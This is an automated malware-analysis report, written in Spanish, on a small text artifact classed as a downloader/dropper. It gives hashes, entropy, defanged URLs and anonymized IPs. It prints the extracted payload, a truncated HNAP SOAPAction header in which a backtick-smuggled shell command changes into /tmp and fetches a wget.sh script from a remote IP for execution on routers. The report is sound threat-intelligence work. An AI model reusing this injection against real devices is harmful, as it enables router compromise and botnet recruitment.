# 🧬 Payload Analysis

`ba1f595900bbf7115f1fe644a548f96bcf0cd5c1e14ab24258401bee0951a2f0`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 368 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `GetDeviceSettings` en `hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ba1f595900bbf7115f1fe644a548f96bcf0cd5c1e14ab24258401bee0951a2f0`
- **MD5:** `db1c2a430fcb791af4f5ea7c99a7de6b`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 368 B |
| Entropía | 5.33 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd && cd tmp && export PATH=$PATH:. && cd /tmp;wget http:/
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/ | strings |
| url | hxxp://94.156.152.XXX/a/wget.sh;chmod | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 94.156.152.XXX | static_analysis |
| command | SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd && cd tmp && export PATH=$PATH:. && cd /tmp;wget http:/ | strings |
| hash | ba1f595900bbf7115f1fe644a548f96bcf0cd5c1e14ab24258401bee0951a2f0 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
